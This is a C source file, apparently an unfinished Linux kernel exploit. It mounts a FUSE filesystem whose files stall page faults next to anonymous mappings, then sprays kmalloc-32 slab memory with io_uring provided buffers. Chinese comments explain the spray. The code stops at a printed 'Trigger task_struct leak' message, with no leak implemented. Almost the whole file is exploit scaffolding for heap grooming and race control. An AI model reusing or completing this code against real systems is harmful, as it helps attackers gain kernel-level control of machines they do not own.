#include <fcntl.h>
#include <stdio.h>
#include <liburing.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/mman.h>

#define QUEUE_DEPTH 0x800
#define PAGE_SIZE 0x1000

int group_v1 = 0x114514;
int group_v2 = 0xdeadbeef;

char buf_v1[0x1000][0x100] = {0};
char buf_v2[0x1000][0x100] = {0};

pthread_mutex_t lock1 = {0};
pthread_mutex_t lock2 = {0};
pthread_mutex_t lock3 = {0};
pthread_mutex_t lock4 = {0};
pthread_mutex_t lock5 = {0};

void *copy_map1 = NULL;
void *copy_map2 = NULL;
void *copy_map3 = NULL;

void *sleep_map1 = NULL;
void *sleep_map2 = NULL;
void *sleep_map3 = NULL;

void *block_map1 = NULL;



struct io_uring ring = {0};
struct io_uring_params uring_params = {0};

void failure(char * msg){
    perror(msg); exit(1);
}

int setup_fuse(void){
    int result = -1;
    char *cmd = "mkdir -p /tmp/fuse_mount && ./hog_fs /tmp/fuse_mount";
    int fuse_fd1 = -1;
    int fuse_fd2 = -1;
    int fuse_fd3 = -1;
    int fuse_fd4 = -1;

    if(system(cmd) != 0){
        failure("system");
    }
    
    fuse_fd1 = open("/tmp/fuse_mount/task", O_RDWR);
    if(fuse_fd1 < 0){
        failure("open");
    }
    copy_map1 = mmap((void *)0x1000, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if(copy_map1 == MAP_FAILED){
        failure("mmap");
    }
    sleep_map1 = mmap(copy_map1 + PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd1, 0);
    if(copy_map1 + PAGE_SIZE != sleep_map1){
        failure("mmap");
    }
    

    fuse_fd2 = open("/tmp/fuse_mount/seqop", O_RDWR);
    if(fuse_fd2 < 0){
        failure("open");
    }
    copy_map2 = mmap(sleep_map1 + PAGE_SIZE, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if(copy_map2 == MAP_FAILED){
        failure("mmap");
    }
    sleep_map2 = mmap(copy_map2 + PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd2, 0);
    if(copy_map2 + PAGE_SIZE != sleep_map2){
        failure("mmap");
    }


    fuse_fd3 = open("/tmp/fuse_mount/iobuf", O_RDWR);
    if(fuse_fd3 < 0){
        failure("open");
    }
    copy_map3 = mmap(sleep_map2 + PAGE_SIZE, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if(copy_map3 == MAP_FAILED){
        failure("mmap");
    }
    sleep_map3 = mmap(copy_map3 + PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd3, 0);
    if(copy_map3 + PAGE_SIZE != sleep_map3){
        failure("mmap");
    }

    
    fuse_fd4 = open("/tmp/fuse_mount/bpfprog", O_RDWR);
    if(fuse_fd4 < 0){
        failure("open");
    }
    block_map1 = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd4, 0);
    if(block_map1 == MAP_FAILED){
        failure("mmap");
    }
    return 0;
}





void setup(){
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;

    /* 创建线程后阻塞 */
    pthread_mutex_lock(&lock1);
    pthread_mutex_lock(&lock2);
    pthread_mutex_lock(&lock3);
    pthread_mutex_lock(&lock4);
    pthread_mutex_lock(&lock5);

    /* 映射fuse中的文件 */
    setup_fuse();

    printf("[*]Tryinng to initialize the io_uring...\n");
    /* 实现和io_uring_queue_init()类似,只不过这里传递的参数不同罢了 */
    if(io_uring_queue_init_params(QUEUE_DEPTH, &ring, &uring_params) != 0){
        printf("[x]Initialize the io_uring failed...\n");
        exit(1);
    }
    printf("[+]Initialize the io_uring successfully!\n");
   


    printf("[*]Trying to spray the kmalloc-32 with io_buffer...\n");
    sqe = io_uring_get_sqe(&ring);
    /* 让内核分配1000个struct io_buffer 结构体*/
    /* 经过计算一个kmalloc-32通用内存的slab是一个page大小,也就是说可以容纳128个io_buffer */
    io_uring_prep_provide_buffers(sqe, buf_v1, 0x100, 1000, group_v1, 0);
    io_uring_submit(&ring);
    /* 等待上面的堆喷事件的结束 */
    io_uring_wait_cqe(&ring, &cqe);
    /* 这里是为了告知内核这个cqe已经被处理过了,适当清理空间 */
    io_uring_cqe_seen(&ring, cqe);
    /* 这里的字段是返回的结果状态code */
    if(cqe->res < 0){
        printf("[x]spary the io_buffer failed...\n");
        exit(1);
    }
    
    printf("[*]Trigger task_struct leak...\n");


}


int main(void){
    setup(); 
}

